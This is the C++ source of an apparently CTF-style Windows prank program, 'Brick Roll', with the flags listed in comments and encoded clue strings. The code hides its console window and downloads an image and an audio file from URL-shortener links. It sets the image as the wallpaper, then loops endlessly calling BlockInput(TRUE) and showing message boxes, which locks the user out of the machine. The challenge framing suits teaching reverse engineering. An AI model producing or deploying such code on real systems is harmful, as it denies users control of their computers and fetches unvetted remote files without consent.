/*
* FLAGS
- Gotta make you understand
- Never gonna let you down
- Dont_tell_me_youre_too_blind_to_see
- We're no strangers to love
- (Inside, we both know what’s been going on)
- Name of executable (Brick Roll)
*/

#define _WIN32_WINNT 0x0A00

#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <shellapi.h>
#include <winreg.h>
#include <fileapi.h>
#include <cstdio>
#include <stdlib.h>
#include <string>
#include <WinBase.h>
#include <direct.h>
#include <filesystem>
#include <string>
#include <shlobj_core.h>
#include <Shlwapi.h>
#include <fstream>


#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Urlmon.lib")



//Work on playing music
using namespace std;

void brickroll()
{
    while (TRUE)
    {
        //Blocks the input of the users.
        BlockInput(TRUE);
        HWND hWnd3 = nullptr;
        MessageBoxA(hWnd3, "Hey Daddio, Ricky needs some of that sweet sweet internet connection ;)", "No internet, no flag >:(", NULL);

    }
}

void song_download()
{

    //Download Song
    const wchar_t* sURL = L"https://is.gd/x87qS2";

    const wchar_t* dFile = L"Never_gonna_let_you_down.wav";

    URLDownloadToFile(NULL, sURL, dFile, 0, NULL);

    char* song_local = getenv("TEMP");
    strcat(song_local, "\\Never_gonna_let_you_down.wav");

    MoveFileA("Never_gonna_let_you_down.wav", getenv("TEMP"));

    remove("Never_gonna_let_you_down.wav");

    //Add PlaySound function to play the downloaded song
    while (TRUE)
    {
        PlaySoundA(song_local, NULL, SND_ASYNC);
        brickroll();

    }
}


void img_download()
{
    // URL of the music file, image file etc.
    const wchar_t* sURL = L"https://cutt.ly/YPOqiPS";
    // Name of the Destination file 
    const wchar_t* dFile = L"Were_no_strangers_to_love.png";
    URLDownloadToFile(NULL, sURL, dFile, 0, NULL);

    //Move the downloaded file to the specified location.
    MoveFile(L"Were_no_strangers_to_love.png", L"C:\\Users\\Public\\Pictures\\Were_no_strangers_to_love.png");
    remove("Were_no_strangers_to_love.png");

    //Set the image as a wallpaper.
    const wchar_t* path = L"C:\\Users\\Public\\Pictures\\Were_no_strangers_to_love.png";
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);



}

//Perform boolean check to see if internet connection is available 
bool ICon() {
    if (system("ping rickroll.com"))
    {
        HWND hWnd2 = nullptr;
        MessageBoxA(hWnd2, "Hey Daddio, Ricky needs some of that sweet sweet internet connection ;)", "No internet, no flag >:(", NULL);

        // Create and open a text file
        ofstream MyFile("sus.txt");

        // Write to the file
        MyFile << "Not so fast, you need to find the key first ;)....\n\n Fnssz_lzjd_xnt_tmcdqrszmc";

        // Close the file
        MyFile.close();

        MoveFile(L"sus.txt", L"C:\\Users\\Public\\Documents\\sus.txt");

        exit(0);
    }
    else
    {
        return true;
    }
}


//Starts webbrowser leading to Rick Roll youtube video.
void not_a_flag()
{
    const char* no_really_this_isnt_a_string = "https://bit.ly/32Yji3i";
}


int main(int argc, char** argv)
{


    if (argc == 2)
    {
        printf("RG9udF90ZWxsX21lX3lvdXJlX3Rvb19ibGluZF90b19zZWU=");
        exit(0);
    }

    //Handles and hides the console window.
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    //Initialize the internet check function.
    ICon();

    img_download();

    song_download();


    return 0;
}